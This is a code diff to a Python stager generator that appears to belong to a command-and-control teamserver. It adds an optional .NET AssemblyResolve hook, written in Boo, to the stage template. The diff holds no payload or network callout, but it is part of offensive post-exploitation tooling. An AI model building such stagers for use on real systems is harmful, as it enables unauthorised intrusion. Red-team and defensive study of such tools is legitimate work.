@@ -2,6 +2,14 @@ import logging
 import os
 from io import StringIO
 
+assemblyresolve_event_handler = """public static def MyResolveEventHandler(sender as object, args as ResolveEventArgs) as Assembly:
+    #print("Trying to resolve $(args.Name).dll")
+    result = [asm for asm in AppDomain.CurrentDomain.GetAssemblies()].Find() do (item as Assembly):
+        return @/,/.Split(item.ToString())[0] == args.Name
+    return result"""
+
+assemblyresolve_event_hook = "AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)"
+
 def get_comms(comms):
     comms_section = StringIO()
     comm_classes = []
@@ -14,11 +22,12 @@ def get_comms(comms):
 
     return ", ".join(comm_classes), comms_section.getvalue()
 
-#@subscribe(events.ENCRYPT_STAGE)
-def gen_stager_code(comms):
+def gen_stager_code(comms, hook_assemblyresolve_event=False):
     with open('./core/teamserver/data/stage.boo') as stage:
         comm_classes, comms_section = get_comms(comms)
         stage = stage.read()
         stage = stage.replace("PUT_COMMS_HERE", comms_section)
         stage = stage.replace("PUT_COMM_CLASSES_HERE", comm_classes)
+        stage = stage.replace("ASSEMBLY_RESOLVE_HOOK_GOES_HERE", assemblyresolve_event_hook if hook_assemblyresolve_event else '')
+        stage = stage.replace("ASSEMBLY_RESOLVE_EVENT_HANDLER_GOES_HERE", assemblyresolve_event_handler if hook_assemblyresolve_event else '')
         return stage
